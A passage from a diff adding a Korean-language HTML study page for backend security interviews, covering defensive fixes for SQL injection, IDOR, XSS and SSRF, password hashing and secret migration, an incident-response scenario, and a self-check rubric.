+        <p>"세 가지 심각한 문제가 보입니다. 첫째, 검색 API는 문자열 조립으로 SQL Injection에 노출되어 있어 파라미터 바인딩으로 바꿔야 합니다. 둘째, 주문 조회는 로그인 여부만 확인하고 그 주문이 요청자 소유인지 확인하지 않는 IDOR입니다 — 쿼리 자체에 <code>user_id = req.user.id</code> 조건을 추가해야 합니다. 이건 SQL Injection보다 놓치기 쉬운데, 인증 미들웨어를 통과했다는 사실이 인가까지 확인됐다는 착각을 주기 때문입니다. 셋째, 소개글 렌더링은 템플릿 엔진의 이스케이핑이 꺼져 있다면 저장형 XSS로 이어지므로 자동 이스케이핑을 확인해야 합니다. 마지막으로 외부 이미지 다운로드는 SSRF로 클라우드 메타데이터 엔드포인트에 접근할 수 있어 사설 IP 대역을 차단하는 필터가 필요합니다."</p>
+      </div>
+      <div class="card weak">
+        <div class="label w">약한 답변</div>
+        <p>"SQL Injection이 있으니까 ORM을 쓰면 될 것 같습니다."</p>
+      </div>
+    </div>
+    <p style="color:var(--muted);font-size:0.9rem;margin-top:-0.5rem;">
+      약한 답변이 약한 이유: 코드에 존재하는 4가지 취약점 중 1가지만 발견했고, 그마저도 "ORM을 쓴다"는 일반론에 그쳐 왜 파라미터 바인딩이 근본적 해결책인지 설명하지 못했습니다. 실무에서는 ORM을 쓰더라도 raw query나 문자열 보간이 섞여 들어가는 경우가 많아 "ORM 사용"이 만능 해결책이 아닙니다.
+    </p>
+
+    <div class="card followup">
+      <div class="label f">Senior Follow-up</div>
+      <p class="quote">"코드 리뷰만으로 이런 취약점을 다 잡을 수 있을까요? 조직 차원에서 이런 패턴이 반복되지 않게 하려면 무엇을 하시겠습니까?"</p>
+      <p style="margin-top:0.8rem;font-size:0.9rem;">
+        <strong>모범 추론:</strong> 코드 리뷰는 사람의 주의력에 의존하므로 놓치는 경우가 반드시 생깁니다. 조직 차원에서는 <strong>여러 층의 방어(defense in depth)</strong>를 조합합니다.
+        정적 분석 도구(SAST)를 CI 파이프라인에 넣어 SQL 문자열 조립, 미검증 리다이렉션 같은 패턴을 자동으로 탐지하고, 의존성 취약점 스캔(SCA)으로 라이브러리 CVE를 추적합니다.
+        IDOR처럼 정적 분석으로 잡기 어려운 인가 누락은, <strong>공통 인가 미들웨어/정책 계층을 강제</strong>해 개발자가 매번 소유권 체크를 손으로 짜지 않고 프레임워크 수준에서 보장하도록 만드는 것이 더 근본적입니다.
+        또한 정기적인 침투 테스트와 버그 바운티로 자동화 도구가 놓치는 로직 취약점(IDOR, 비즈니스 로직 우회 등)을 사람이 다시 확인하고, 발견된 취약점 패턴은 체크리스트화해 신규 PR 템플릿이나 시큐어 코딩 가이드에 반영해 같은 실수가 반복되지 않도록 조직의 지식으로 축적합니다.
+      </p>
+    </div>
+  </section>
+
+  <!-- ───────────── 5. SECRETS & ENCRYPTION ───────────── -->
+  <section id="section-secrets">
+    <h2>5. 비밀번호, 시크릿, 암호화 — 해싱, 키 관리, 전송/저장 보호</h2>
+
+    <h3>배경 개념: "암호화해서 저장한다"는 말은 대부분 틀린 표현이다</h3>
+    <p>
+      비밀번호는 <strong>암호화(encryption)해서 저장하면 안 됩니다.</strong> 암호화는 키만 있으면 원문으로 복호화할 수 있는 양방향 연산이라, DB나 키가 유출되면 모든 사용자의 평문 비밀번호가 그대로 드러납니다.
+      비밀번호는 <strong>해싱(hashing)</strong>, 그중에서도 <strong>느리게 설계된 적응형 해시 함수</strong>(bcrypt, scrypt, Argon2)로 저장해야 합니다. 일반 해시 함수(SHA-256 등)는 빠르다는 것 자체가 문제입니다 — GPU로 초당 수십억 번 해싱을 시도하는 무차별 대입(brute-force)에 취약해지기 때문입니다.
+    </p>
+
+    <div class="card question">
+      <div class="label q">면접 질문</div>
+      <p class="quote">"레거시 시스템을 인수인계 받았는데, 비밀번호가 <code>MD5(password)</code>로 저장되어 있고, 결제 API 키 같은 시크릿은 소스코드에 하드코딩되어 깃 저장소에 커밋되어 있습니다. 우선순위를 어떻게 정해서 개선하시겠습니까?"</p>
+    </div>
+
+    <h4>면접관이 보는 신호</h4>
+    <p>"전부 즉시 다 바꾸겠습니다"처럼 현실성 없는 답을 하는지, 아니면 <strong>기존 사용자의 로그인 흐름을 깨지 않으면서 점진적으로 마이그레이션하는 현실적인 계획</strong>을 세우는지를 봅니다.</p>
+
+    <h4>결정 순서</h4>
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-body">
+        <strong>시크릿 하드코딩부터 즉시 조치합니다.</strong> 깃 히스토리에 남은 API 키는 파일만 삭제해서는 사라지지 않으므로(히스토리에 그대로 남음), 해당 키 자체를 발급처에서 즉시 폐기·재발급하고, 이후 시크릿은 환경 변수나 Vault/AWS Secrets Manager 같은 시크릿 관리 도구에서 런타임에 주입하도록 바꿉니다. 이건 되돌릴 수 없는 유출이 이미 발생했을 수 있다는 전제로 최우선 처리합니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-body">
+        <strong>비밀번호 해시는 "지연 마이그레이션(lazy migration)"으로 전환합니다.</strong> 기존 사용자를 강제로 비밀번호 재설정시키지 않고, 로그인 시점에 MD5로 검증에 성공하면 그 순간 평문 비밀번호를 bcrypt/Argon2로 재해싱해 저장하도록 로그인 로직에 한 단계를 추가합니다. 자연스럽게 로그인하는 사용자부터 순차적으로 안전한 해시로 전환됩니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-body">
+        <strong>일정 기간 로그인하지 않는 계정에 대한 정책을 정합니다.</strong> N개월간 로그인하지 않아 지연 마이그레이션이 되지 않은 계정은, 다음 로그인 시 강제 비밀번호 재설정을 요구하거나, 별도 배치로 알림을 보내 재로그인을 유도합니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">4</div>
+      <div class="step-body">
+        <strong>재발 방지를 위한 가드레일을 추가합니다.</strong> 시크릿 스캐닝 도구(gitleaks, truffleHog 등)를 CI와 pre-commit 훅에 넣어 하드코딩된 시크릿이 커밋되는 것 자체를 차단하고, 코드 리뷰 체크리스트에 "새 비밀번호 관련 코드는 반드시 승인된 해시 라이브러리를 사용하는가"를 추가합니다.
+      </div>
+    </div>
+
+    <h4>전송 중(in transit) vs 저장 시(at rest) 암호화</h4>
+    <table>
+      <thead>
+        <tr>
+          <th>구분</th>
+          <th>보호 대상</th>
+          <th>실무 적용</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>전송 중 암호화</td>
+          <td>네트워크를 통과하는 데이터(클라이언트↔서버, 서버↔서버, 서버↔DB)</td>
+          <td>TLS 1.2+ 강제, 내부망이라도 서비스 간 통신에 mTLS 적용 고려(제로 트러스트), 평문 프로토콜(HTTP, 암호화 없는 DB 커넥션) 사용 금지</td>
+        </tr>
+        <tr>
+          <td>저장 시 암호화</td>
+          <td>디스크/DB/백업에 저장된 데이터</td>
+          <td>DB 볼륨 암호화(EBS 암호화 등)로 물리 디스크 탈취에 대비, 주민등록번호·카드번호 같은 고민감 필드는 컬럼 단위 암호화(응용 계층 암호화)로 DB 관리자 권한만으로는 평문을 볼 수 없게 이중 방어</td>
+        </tr>
+        <tr>
+          <td>키 관리</td>
+          <td>암호화에 사용되는 키 자체의 보호</td>
+          <td>키를 애플리케이션 코드/설정 파일에 두지 않고 KMS(AWS KMS, HashiCorp Vault)에서 관리, 정기적인 키 로테이션, 키에 대한 접근도 최소 권한 원칙(IAM)으로 감사 로그 남기기</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="grid-2">
+      <div class="card good">
+        <div class="label g">강한 답변</div>
+        <p>"가장 시급한 건 이미 유출됐을 수 있는 시크릿입니다. 깃 히스토리에 남은 API 키는 파일 삭제로 안 지워지므로 발급처에서 즉시 폐기·재발급하고, 앞으로는 Vault에서 런타임 주입으로 바꾸겠습니다. 비밀번호는 사용자 전체를 강제 초기화하면 로그인 이탈이 커지므로, 로그인 성공 시점에 MD5 검증 후 즉시 bcrypt로 재해싱하는 지연 마이그레이션을 넣어 자연스럽게 전환시키고, 6개월 이상 미접속 계정은 다음 로그인 때 강제 재설정을 요구하겠습니다. 재발 방지로 gitleaks를 pre-commit과 CI에 추가하겠습니다."</p>
+      </div>
+      <div class="card weak">
+        <div class="label w">약한 답변</div>
+        <p>"MD5는 안전하지 않으니 bcrypt로 바꾸고, API 키는 환경 변수로 옮기겠습니다."</p>
+      </div>
+    </div>
+    <p style="color:var(--muted);font-size:0.9rem;margin-top:-0.5rem;">
+      약한 답변이 약한 이유: "무엇으로 바꿀지"만 말했을 뿐 "어떻게 사용자 영향 없이 전환할지"와 "이미 유출됐을 가능성에 어떻게 대응할지"에 대한 계획이 없습니다. bcrypt로 바꾸는 것은 맞지만, 기존 사용자의 저장된 해시를 즉시 bcrypt로 재계산하는 것은 원문 비밀번호 없이는 불가능하므로, 지연 마이그레이션 전략 없이는 실행 불가능한 답변입니다.
+    </p>
+
+    <div class="card followup">
+      <div class="label f">Senior Follow-up</div>
+      <p class="quote">"bcrypt와 Argon2 중 무엇을 선택하시겠습니까? 그리고 해시 비용 파라미터(work factor)를 어떻게 정하시겠습니까?"</p>
+      <p style="margin-top:0.8rem;font-size:0.9rem;">
+        <strong>모범 추론:</strong> 두 알고리즘 모두 적응형(work factor를 높이면 계산 비용이 기하급수적으로 증가)이라는 공통점이 있지만, <strong>Argon2(특히 Argon2id)</strong>는 2015년 Password Hashing Competition 우승작으로, 계산 시간뿐 아니라 <strong>메모리 사용량도 파라미터로 조절</strong>할 수 있어 GPU/ASIC 기반 병렬 무차별 대입에 더 강한 저항성을 가집니다. 신규 프로젝트라면 Argon2id를 우선 고려하는 것이 최신 권고(OWASP 권장)에 부합합니다.
+        다만 bcrypt는 수십 년간 검증된 실적과 대부분의 언어/프레임워크에서의 성숙한 라이브러리 지원이 강점이라, 기존에 bcrypt를 쓰고 있고 알려진 취약점이 없다면 마이그레이션 비용 대비 이득이 크지 않을 수 있습니다.
+        work factor는 <strong>"로그인 요청 하나를 처리하는 데 허용 가능한 시간"</strong>(보통 서버 기준 수백 ms 내외)을 정하고, 그 시간 안에서 최대한 비용이 크도록 역산해서 정합니다. 너무 낮으면 무차별 대입에 취약하고, 너무 높으면 정상 로그인 요청도 느려지고 서버 자원을 과도하게 소모해 로그인 엔드포인트 자체가 DoS에 취약해질 수 있으므로, 주기적으로 하드웨어 성능 향상에 맞춰 재조정해야 하는 값입니다.
+      </p>
+    </div>
+  </section>
+
+  <!-- ───────────── 6. SCENARIO ───────────── -->
+  <section id="section-scenario">
+    <h2>6. 종합 시나리오 — 유출된 세션 토큰, 새벽의 보안 사고</h2>
+    <div class="card question">
+      <div class="label q">면접 질문</div>
+      <p class="quote">"고객 지원팀으로부터 '내 계정에서 내가 하지 않은 주문이 여러 건 발생했다'는 신고가 새벽에 여러 건 동시에 들어왔습니다. 지금부터 무엇을 확인하고, 어떤 순서로 조치하시겠습니까?"</p>
+    </div>
+    <p>이 질문은 오늘 배운 인증/인가, JWT 무효화, OWASP 취약점, 시크릿 관리 지식을 <strong>실제 사고 대응 타임라인</strong>으로 종합하는 능력을 봅니다.</p>
+
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-body">
+        <strong>즉시: 영향 범위부터 좁힙니다.</strong> 신고가 여러 계정에서 동시에 들어왔다는 것은 개별 계정의 비밀번호 유출보다, <strong>공통된 취약점(예: 특정 API의 IDOR, 세션/토큰 발급 로직의 결함, 혹은 대규모 크리덴셜 스터핑)</strong>일 가능성을 시사합니다. 영향받은 계정들의 공통점(같은 시간대 가입, 같은 API 사용 패턴 등)을 로그에서 먼저 확인합니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-body">
+        <strong>단기 완화: 의심되는 세션/토큰을 무효화합니다.</strong> 영향받은 계정의 Refresh Token을 DB에서 즉시 삭제하고, Access Token 블랙리스트에 등록해 추가 피해를 차단합니다. 동시에 해당 계정의 결제/주문 관련 민감 동작을 임시로 잠급니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-body">
+        <strong>원인 조사: 접근 로그와 최근 배포 이력을 대조합니다.</strong> 주문 API의 접근 로그에서 동일 IP/User-Agent가 여러 계정의 주문 엔드포인트를 순차적으로 호출했는지(IDOR 자동화 스캔의 흔적), 혹은 최근 배포에서 인가 체크가 실수로 빠진 코드가 배포됐는지 대조합니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">4</div>
+      <div class="step-body">
+        <strong>병행: 법무/개인정보보호 책임자와 고객 커뮤니케이션 라인을 가동합니다.</strong> 결제 정보나 개인정보가 노출된 것으로 확인되면 관련 법령(예: 개인정보보호법의 유출 신고 의무)에 따른 신고 절차가 필요할 수 있으므로, 기술팀 단독으로 조용히 처리하지 않고 초기 단계에서부터 관련 부서와 공유합니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">5</div>
+      <div class="step-body">
+        <strong>근본 원인 확정 후: 취약점을 패치하고 검증합니다.</strong> IDOR로 확인되면 소유권 검증 누락을 수정하고, 동일 패턴이 다른 엔드포인트에도 있는지 전수 조사합니다. 크리덴셜 스터핑이면 로그인 시도에 대한 rate limiting과 이상 탐지(다른 지역/기기에서의 로그인 알림)를 강화합니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">6</div>
+      <div class="step-body">
+        <strong>사후: 블레임리스 포스트모텀과 재발 방지책을 남깁니다.</strong> 왜 이 취약점이 코드 리뷰와 테스트를 통과했는지 분석하고, 인가 체크를 프레임워크 수준에서 강제하는 구조적 개선이나, 인증/인가 관련 코드에 대한 필수 보안 리뷰어 지정 같은 조직적 액션 아이템을 등록합니다.
+      </div>
+    </div>
+
+    <div class="highlight-box">
+      <strong>시니어가 반드시 언급해야 하는 것</strong>: 단일 계정 문제가 아니라 <strong>공통 취약점일 가능성부터 의심</strong>하는 패턴 인식, 원인을 완전히 알기 전에도 <strong>세션/토큰 무효화 같은 즉각적인 피해 차단 조치</strong>를 먼저 취하는 우선순위 감각, 그리고 기술팀 내부에서만 조용히 처리하지 않고 <strong>법무·고객 커뮤니케이션까지 포함한 조직적 대응</strong>으로 사고를 다루는 관점입니다. "비밀번호를 바꾸라고 안내하겠습니다"에서 답이 끝나면, IDOR 같은 시스템 자체의 결함 가능성을 놓친 것입니다.
+    </div>
+  </section>
+
+  <!-- ───────────── 7. RUBRIC ───────────── -->
+  <section id="section-rubric">
+    <h2>7. 자기 점검 Rubric</h2>
+    <p>각 항목을 솔직하게 채점하세요. ●●●=잘 설명할 수 있음, ●●○=부분적으로 앎, ●○○=어렴풋이 앎, ○○○=모름</p>
+
+    <div class="card rubric">
+      <div class="rubric-item">
+        <span>인증(AuthN)과 인가(AuthZ)의 차이를 설명하고, 코드 구조에서 왜 별개 계층으로 분리해야 하는지 설명할 수 있다</span>
+        <div class="rubric-score"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+      <div class="rubric-item">
+        <span>세션 기반 인증과 JWT 기반 인증의 trade-off, 그리고 OAuth2와 OIDC의 역할 차이를 설명할 수 있다</span>
+        <div class="rubric-score"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+      <div class="rubric-item">
+        <span>JWT의 alg confusion 공격 원리와, stateless 토큰의 즉시 무효화 문제 및 완화 방법을 설명할 수 있다</span>
+        <div class="rubric-score"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+      <div class="rubric-item">
+        <span>SQL Injection, IDOR/BOLA, 저장형 XSS, SSRF를 실제 코드 패턴으로 식별하고 수정 방법을 제시할 수 있다</span>
+        <div class="rubric-score"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+      <div class="rubric-item">
+        <span>CSRF의 공격 조건과 SameSite 쿠키/CSRF 토큰 방어 원리를 설명할 수 있다</span>
+        <div class="rubric-score"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+      <div class="rubric-item">
+        <span>암호화와 해싱의 차이, bcrypt/Argon2 같은 적응형 해시 함수가 필요한 이유를 설명할 수 있다</span>
+        <div class="rubric-score"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+      <div class="rubric-item">
+        <span>레거시 취약점(약한 해시, 하드코딩된 시크릿)을 사용자 영향 없이 점진적으로 마이그레이션하는 계획을 세울 수 있다</span>
+        <div class="rubric-score"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+      <div class="rubric-item">
+        <span>전송 중/저장 시 암호화와 키 관리(KMS/Vault)를 구분하고, 보안 사고 발생 시 기술·법무·커뮤니케이션을 아우르는 대응 절차를 설명할 수 있다</span>
+        <div class="rubric-score"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+    </div>
+
+    <h3>점수 해석</h3>
+    <ul>
+      <li><strong>7~8개 ●●●</strong>: 보안 영역 시니어 수준. Day 9로 진행해도 됩니다.</li>
+      <li><strong>4~6개 ●●●</strong>: 핵심은 알지만 ●●○ 항목을 다시 읽고 자신의 프로젝트 코드에서 같은 패턴을 실제로 찾아보세요.</li>
+      <li><strong>3개 이하 ●●●</strong>: OWASP Top 10 실전 섹션과 종합 시나리오를 한 번 더 읽고, 4번 섹션의 코드 예시를 직접 고쳐 실행해보세요.</li>
+    </ul>
+
+    <h3>추천 복습 방법</h3>
+    <p>오늘 배운 내용 중 가장 자신 없는 질문 하나를 골라, 면접관 앞에서 말하듯 2~3분간 소리 내어 설명해보세요. 막히는 부분이 실제로 모르는 부분입니다.</p>
+  </section>
+
+  <!-- ───────────── NAVIGATION ───────────── -->
+  <div class="nav-bottom">
+    <a href="./0007-reliability-and-incident-response.html">← Day 7: 신뢰성 &amp; 장애 대응</a>
+    <a href="./index.html">목록으로</a>
+    <span style="color:var(--muted);font-size:0.9rem;">Day 9: 관측성 →</span>
+  </div>
+
+</div>
+</body>
+</html>
